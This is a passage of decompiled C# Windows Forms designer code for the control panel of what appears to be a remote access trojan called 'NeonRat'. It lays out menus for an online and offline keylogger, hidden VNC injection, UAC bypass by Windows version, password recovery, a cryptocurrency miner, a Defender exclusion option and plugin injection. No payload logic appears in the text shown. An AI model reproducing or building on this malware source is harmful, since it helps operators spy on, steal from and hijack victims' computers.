			this.addNeonRatExcludeForWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.otherFunctionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.adminPermisionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
			this.minerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.compileMinerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.startToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.activateMinerPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.listView2 = new System.Windows.Forms.ListView();
			this.colDateTime = new System.Windows.Forms.ColumnHeader();
			this.colEven = new System.Windows.Forms.ColumnHeader();
			this.guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
			this.imageList2 = new System.Windows.Forms.ImageList(this.components);
			this.lblOnline = new Guna2HtmlLabel();
			this.listView1 = new System.Windows.Forms.ListView();
			this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader6 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader7 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader8 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader9 = new System.Windows.Forms.ColumnHeader();
			this.imageList1 = new System.Windows.Forms.ImageList(this.components);
			this.notifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.timer2 = new System.Windows.Forms.Timer(this.components);
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.iconrestaurar = new System.Windows.Forms.PictureBox();
			this.iconmaximizar = new System.Windows.Forms.PictureBox();
			this.pictureBox4 = new System.Windows.Forms.PictureBox();
			this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.bunifuSeparator8 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator9 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuGradientPanel1 = new Bunifu.UI.WinForms.BunifuGradientPanel();
			this.bunifuSeparator11 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.btnLogout = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnTelegram = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnTuts = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnShop = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnBuilder = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnClients = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuSeparator16 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator13 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator10 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator7 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator6 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator5 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator3 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator12 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator14 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuIconButton1 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.lblRAM = new Bunifu.UI.WinForms.BunifuLabel();
			this.lblCPU = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuLabel4 = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuLabel3 = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuProgressBar2 = new Bunifu.UI.WinForms.BunifuProgressBar();
			this.bunifuProgressBar1 = new Bunifu.UI.WinForms.BunifuProgressBar();
			this.customLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.bunifuPanel2 = new Bunifu.UI.WinForms.BunifuPanel();
			this.bunifuPanel1 = new Bunifu.UI.WinForms.BunifuPanel();
			this.chkNot = new MetroSet_UI.Controls.MetroSetSwitch();
			this.bunifuSeparator17 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.customLabel4 = new Bunifu_Controls.CustomLabel();
			this.bunifuSeparator15 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.Guna2HtmlLabel = new Guna2HtmlLabel();
			this.Guna2HtmlLabel1 = new Guna2HtmlLabel();
			this.chkLogs = new MetroSet_UI.Controls.MetroSetSwitch();
			this.metroSetSwitch1 = new MetroSet_UI.Controls.MetroSetSwitch();
			this.customLabel3 = new Bunifu_Controls.CustomLabel();
			this.customLabel2 = new Bunifu_Controls.CustomLabel();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			this.hvncpanel = new Bunifu.UI.WinForms.BunifuPanel();
			this.labelspeed = new Guna2HtmlLabel();
			this.Guna2HtmlLabel4 = new Guna2HtmlLabel();
			this.bunifuSeparator18 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.label11 = new System.Windows.Forms.Label();
			this.label10 = new System.Windows.Forms.Label();
			this.bunifuTransition1 = new Bunifu.UI.WinForms.BunifuTransition(this.components);
			this.bunifuTransition2 = new Bunifu.UI.WinForms.BunifuTransition(this.components);
			this.pRAM = new System.Diagnostics.PerformanceCounter();
			this.pCPU = new System.Diagnostics.PerformanceCounter();
			this.timer3 = new System.Windows.Forms.Timer(this.components);
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			((System.ComponentModel.ISupportInitialize)this.Guna2PictureBox1).BeginInit();
			this.guna2ContextMenuStrip1.SuspendLayout();
			this.guna2ContextMenuStrip2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.iconrestaurar).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.iconmaximizar).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox4).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox1).BeginInit();
			this.bunifuGradientPanel1.SuspendLayout();
			this.bunifuPanel2.SuspendLayout();
			this.bunifuPanel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pRAM).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pCPU).BeginInit();
			base.SuspendLayout();
			this.Guna2Elipse1.BorderRadius = 0;
			this.Guna2Elipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2PictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2PictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Location = new System.Drawing.Point(12, 14);
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Name = "Guna2PictureBox1";
			this.Guna2PictureBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2PictureBox1;
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Size = new System.Drawing.Size(46, 46);
			((System.Windows.Forms.PictureBox)(object)this.Guna2PictureBox1).TabIndex = 4;
			((System.Windows.Forms.PictureBox)(object)this.Guna2PictureBox1).TabStop = false;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2PictureBox1, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2PictureBox1, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2PictureBox1, "");
			this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuTransition2.SetDecoration(this.guna2ContextMenuStrip1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.guna2ContextMenuStrip1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.guna2ContextMenuStrip1.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(19, 19);
			this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[15]
			{
				this.systemMassageToolStripMenuItem, this.remoteTerminalToolStripMenuItem, this.proccessManagementToolStripMenuItem, this.fileManagementToolStripMenuItem, this.hvncDesktopBrowsersAppsToolStripMenuItem, this.remoteDesktopToolStripMenuItem, this.keyLoggerToolStripMenuItem, this.privilegeEscalationToolStripMenuItem, this.startUpManagerToolStripMenuItem, this.extraToolStripMenuItem,
				this.remoteFunToolStripMenuItem, this.passwordRecoveryToolStripMenuItem, this.remoteSystemManagementToolStripMenuItem, this.otherFunctionsToolStripMenuItem, this.minerToolStripMenuItem
			});
			this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.Gainsboro;
			this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.WhiteSmoke;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
			this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(233, 394);
			this.bunifuToolTip1.SetToolTip(this.guna2ContextMenuStrip1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2ContextMenuStrip1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2ContextMenuStrip1, "");
			this.systemMassageToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.GuiToUnnistall, this.disconectToolStripMenuItem, this.restartConnectionToolStripMenuItem, this.remoteClientUpdateToolStripMenuItem, this.systemInfoToolStripMenuItem, this.TcpToGui });
			this.systemMassageToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.systemMassageToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemMassageToolStripMenuItem.Image");
			this.systemMassageToolStripMenuItem.Name = "systemMassageToolStripMenuItem";
			this.systemMassageToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.systemMassageToolStripMenuItem.Text = "Client Control";
			this.GuiToUnnistall.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.GuiToUnnistall.ForeColor = System.Drawing.Color.White;
			this.GuiToUnnistall.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.GuiToUnnistall.Name = "GuiToUnnistall";
			this.GuiToUnnistall.Size = new System.Drawing.Size(221, 22);
			this.GuiToUnnistall.Text = "Unistall";
			this.GuiToUnnistall.Click += new System.EventHandler(GuiToUnnistall_Click);
			this.disconectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.disconectToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.disconectToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.disconectToolStripMenuItem.Name = "disconectToolStripMenuItem";
			this.disconectToolStripMenuItem.Size = new System.Drawing.Size(221, 22);
			this.disconectToolStripMenuItem.Text = "Disconect";
			this.disconectToolStripMenuItem.Click += new System.EventHandler(disconnectToolStripMenuItem_Click);
			this.restartConnectionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.restartConnectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.remoteLogoutToolStripMenuItem, this.remoteRestartToolStripMenuItem, this.remoteShutDownToolStripMenuItem, this.injectPluginToolStripMenuItem });
			this.restartConnectionToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.restartConnectionToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.restartConnectionToolStripMenuItem.Name = "restartConnectionToolStripMenuItem";
			this.restartConnectionToolStripMenuItem.Size = new System.Drawing.Size(221, 22);
			this.restartConnectionToolStripMenuItem.Text = "Remote Pc";
			this.restartConnectionToolStripMenuItem.Visible = false;
			this.restartConnectionToolStripMenuItem.Click += new System.EventHandler(restartToolStripMenuItem_Click_1);
			this.remoteLogoutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteLogoutToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteLogoutToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteLogoutToolStripMenuItem.Name = "remoteLogoutToolStripMenuItem";
			this.remoteLogoutToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
			this.remoteLogoutToolStripMenuItem.Text = "Remote Logout";
			this.remoteLogoutToolStripMenuItem.Click += new System.EventHandler(remoteLogoutToolStripMenuItem_Click_1);
			this.remoteRestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteRestartToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteRestartToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteRestartToolStripMenuItem.Name = "remoteRestartToolStripMenuItem";
			this.remoteRestartToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
			this.remoteRestartToolStripMenuItem.Text = "Remote Restart";
			this.remoteRestartToolStripMenuItem.Click += new System.EventHandler(RemoterestartToolStripMenuItem_Click);
			this.remoteShutDownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteShutDownToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteShutDownToolStripMenuItem.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteShutDownToolStripMenuItem.Name = "remoteShutDownToolStripMenuItem";
			this.remoteShutDownToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
			this.remoteShutDownToolStripMenuItem.Text = "Remote ShutDown";
			this.remoteShutDownToolStripMenuItem.Click += new System.EventHandler(RemoteshutdownToolStripMenuItem_Click);
			this.injectPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.injectPluginToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.injectPluginToolStripMenuItem.Name = "injectPluginToolStripMenuItem";
			this.injectPluginToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
			this.injectPluginToolStripMenuItem.Text = "Inject Plugin";
			this.injectPluginToolStripMenuItem.Click += new System.EventHandler(pluginRemoteSysInfoToolStripMenuItem_Click);
			this.remoteClientUpdateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteClientUpdateToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteClientUpdateToolStripMenuItem.Name = "remoteClientUpdateToolStripMenuItem";
			this.remoteClientUpdateToolStripMenuItem.Size = new System.Drawing.Size(221, 22);
			this.remoteClientUpdateToolStripMenuItem.Text = "Remote Client Update";
			this.remoteClientUpdateToolStripMenuItem.Visible = false;
			this.remoteClientUpdateToolStripMenuItem.Click += new System.EventHandler(UpdateclientToolStripMenuItem1_Click);
			this.systemInfoToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.systemInfoToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.systemInfoToolStripMenuItem.Name = "systemInfoToolStripMenuItem";
			this.systemInfoToolStripMenuItem.Size = new System.Drawing.Size(221, 22);
			this.systemInfoToolStripMenuItem.Text = "System Info";
			this.systemInfoToolStripMenuItem.Visible = false;
			this.systemInfoToolStripMenuItem.Click += new System.EventHandler(systemInfoToolStripMenuItem_Click);
			this.TcpToGui.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.TcpToGui.ForeColor = System.Drawing.Color.White;
			this.TcpToGui.ImageTransparentColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.TcpToGui.Name = "TcpToGui";
			this.TcpToGui.Size = new System.Drawing.Size(221, 22);
			this.TcpToGui.Text = "Inject Plugin";
			this.TcpToGui.Visible = false;
			this.TcpToGui.Click += new System.EventHandler(TcpToGui_Click);
			this.remoteTerminalToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.remoteTerminalToolStripMenuItem1, this.uploadPluginToolStripMenuItem });
			this.remoteTerminalToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteTerminalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteTerminalToolStripMenuItem.Image");
			this.remoteTerminalToolStripMenuItem.Name = "remoteTerminalToolStripMenuItem";
			this.remoteTerminalToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.remoteTerminalToolStripMenuItem.Text = "Remote Terminal";
			this.remoteTerminalToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteTerminalToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.remoteTerminalToolStripMenuItem1.Name = "remoteTerminalToolStripMenuItem1";
			this.remoteTerminalToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
			this.remoteTerminalToolStripMenuItem1.Text = "Remote Terminal";
			this.remoteTerminalToolStripMenuItem1.Click += new System.EventHandler(remoteShellToolStripMenuItem1_Click);
			this.uploadPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem.Name = "uploadPluginToolStripMenuItem";
			this.uploadPluginToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
			this.uploadPluginToolStripMenuItem.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem.Visible = false;
			this.uploadPluginToolStripMenuItem.Click += new System.EventHandler(pulginToolStripMenuItem_Click);
			this.proccessManagementToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.proccessManagementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.processManagementToolStripMenuItem, this.uploadPluginToolStripMenuItem1 });
			this.proccessManagementToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.proccessManagementToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("proccessManagementToolStripMenuItem.Image");
			this.proccessManagementToolStripMenuItem.Name = "proccessManagementToolStripMenuItem";
			this.proccessManagementToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.proccessManagementToolStripMenuItem.Text = "Process Management";
			this.processManagementToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.processManagementToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.processManagementToolStripMenuItem.Name = "processManagementToolStripMenuItem";
			this.processManagementToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
			this.processManagementToolStripMenuItem.Text = "Process Management";
			this.processManagementToolStripMenuItem.Click += new System.EventHandler(remoteProcessToolStripMenuItem2_Click);
			this.uploadPluginToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem1.Name = "uploadPluginToolStripMenuItem1";
			this.uploadPluginToolStripMenuItem1.Size = new System.Drawing.Size(215, 22);
			this.uploadPluginToolStripMenuItem1.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem1.Visible = false;
			this.uploadPluginToolStripMenuItem1.Click += new System.EventHandler(processPluginToolStripMenuItem_Click);
			this.fileManagementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.fileManagementToolStripMenuItem1, this.uploadPluginToolStripMenuItem3 });
			this.fileManagementToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.fileManagementToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileManagementToolStripMenuItem.Image");
			this.fileManagementToolStripMenuItem.Name = "fileManagementToolStripMenuItem";
			this.fileManagementToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.fileManagementToolStripMenuItem.Text = "File Management";
			this.fileManagementToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.fileManagementToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.fileManagementToolStripMenuItem1.Name = "fileManagementToolStripMenuItem1";
			this.fileManagementToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			this.fileManagementToolStripMenuItem1.Text = "File Management";
			this.fileManagementToolStripMenuItem1.Click += new System.EventHandler(remoteFileToolStripMenuItem2_Click);
			this.uploadPluginToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem3.Name = "uploadPluginToolStripMenuItem3";
			this.uploadPluginToolStripMenuItem3.Size = new System.Drawing.Size(188, 22);
			this.uploadPluginToolStripMenuItem3.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem3.Visible = false;
			this.uploadPluginToolStripMenuItem3.Click += new System.EventHandler(uploadPluginToolStripMenuItem3_Click);
			this.hvncDesktopBrowsersAppsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.hvncPanelToolStripMenuItem, this.injectToolStripMenuItem });
			this.hvncDesktopBrowsersAppsToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.hvncDesktopBrowsersAppsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hvncDesktopBrowsersAppsToolStripMenuItem.Image");
			this.hvncDesktopBrowsersAppsToolStripMenuItem.Name = "hvncDesktopBrowsersAppsToolStripMenuItem";
			this.hvncDesktopBrowsersAppsToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.hvncDesktopBrowsersAppsToolStripMenuItem.Text = "Remote Hvnc";
			this.hvncPanelToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.hvncPanelToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.hvncPanelToolStripMenuItem.Name = "hvncPanelToolStripMenuItem";
			this.hvncPanelToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
			this.hvncPanelToolStripMenuItem.Text = "Inject Hvnc Module";
			this.hvncPanelToolStripMenuItem.Click += new System.EventHandler(hvncPanelToolStripMenuItem_Click);
			this.injectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.injectToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.injectToolStripMenuItem.Name = "injectToolStripMenuItem";
			this.injectToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
			this.injectToolStripMenuItem.Text = "Inject Process";
			this.injectToolStripMenuItem.Visible = false;
			this.injectToolStripMenuItem.Click += new System.EventHandler(injectToolStripMenuItem_Click);
			this.remoteDesktopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteDesktopToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.remoteViewToolStripMenuItem, this.uploadPluginToolStripMenuItem4 });
			this.remoteDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteDesktopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteDesktopToolStripMenuItem.Image");
			this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
			this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
			this.remoteViewToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteViewToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteViewToolStripMenuItem.Name = "remoteViewToolStripMenuItem";
			this.remoteViewToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
			this.remoteViewToolStripMenuItem.Text = "Remote View";
			this.remoteViewToolStripMenuItem.Click += new System.EventHandler(remoteDesktopToolStripMenuItem_Click);
			this.uploadPluginToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem4.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem4.Name = "uploadPluginToolStripMenuItem4";
			this.uploadPluginToolStripMenuItem4.Size = new System.Drawing.Size(163, 22);
			this.uploadPluginToolStripMenuItem4.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem4.Visible = false;
			this.uploadPluginToolStripMenuItem4.Click += new System.EventHandler(remoteDesktopPluginToolStripMenuItem_Click);
			this.keyLoggerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.keyLoggerToolStripMenuItem1, this.offlineKeyLoggerToolStripMenuItem, this.uploadPluginToolStripMenuItem6 });
			this.keyLoggerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.keyLoggerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("keyLoggerToolStripMenuItem.Image");
			this.keyLoggerToolStripMenuItem.Name = "keyLoggerToolStripMenuItem";
			this.keyLoggerToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.keyLoggerToolStripMenuItem.Text = "KeyLogger";
			this.keyLoggerToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.keyLoggerToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.keyLoggerToolStripMenuItem1.Name = "keyLoggerToolStripMenuItem1";
			this.keyLoggerToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			this.keyLoggerToolStripMenuItem1.Text = "Online KeyLogger";
			this.keyLoggerToolStripMenuItem1.Click += new System.EventHandler(remoteKeyboardToolStripMenuItem_Click);
			this.offlineKeyLoggerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.offlineKeyLoggerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.offlineKeyLoggerToolStripMenuItem.Name = "offlineKeyLoggerToolStripMenuItem";
			this.offlineKeyLoggerToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
			this.offlineKeyLoggerToolStripMenuItem.Text = "Offline KeyLogger";
			this.offlineKeyLoggerToolStripMenuItem.Visible = false;
			this.offlineKeyLoggerToolStripMenuItem.Click += new System.EventHandler(offlineKeyLoggerToolStripMenuItem_Click);
			this.uploadPluginToolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem6.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem6.Name = "uploadPluginToolStripMenuItem6";
			this.uploadPluginToolStripMenuItem6.Size = new System.Drawing.Size(188, 22);
			this.uploadPluginToolStripMenuItem6.Text = "Inject Plugin";
			this.uploadPluginToolStripMenuItem6.Visible = false;
			this.uploadPluginToolStripMenuItem6.Click += new System.EventHandler(puginToolStripMenuItem_Click);
			this.privilegeEscalationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.directUacToolStripMenuItem, this.privilegeEscalationToolStripMenuItem1, this.getAdminToolStripMenuItem, this.uploadPluginToolStripMenuItem7, this.activateUACPluginToolStripMenuItem, this.activateOtherPluginToolStripMenuItem });
			this.privilegeEscalationToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.privilegeEscalationToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("privilegeEscalationToolStripMenuItem.Image");
			this.privilegeEscalationToolStripMenuItem.Name = "privilegeEscalationToolStripMenuItem";
			this.privilegeEscalationToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.privilegeEscalationToolStripMenuItem.Text = "Privilege Escalation";
			this.directUacToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.directUacToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.windows10ToolStripMenuItem, this.windows8ToolStripMenuItem, this.windows7ToolStripMenuItem });
			this.directUacToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.directUacToolStripMenuItem.Name = "directUacToolStripMenuItem";
			this.directUacToolStripMenuItem.Size = new System.Drawing.Size(301, 22);
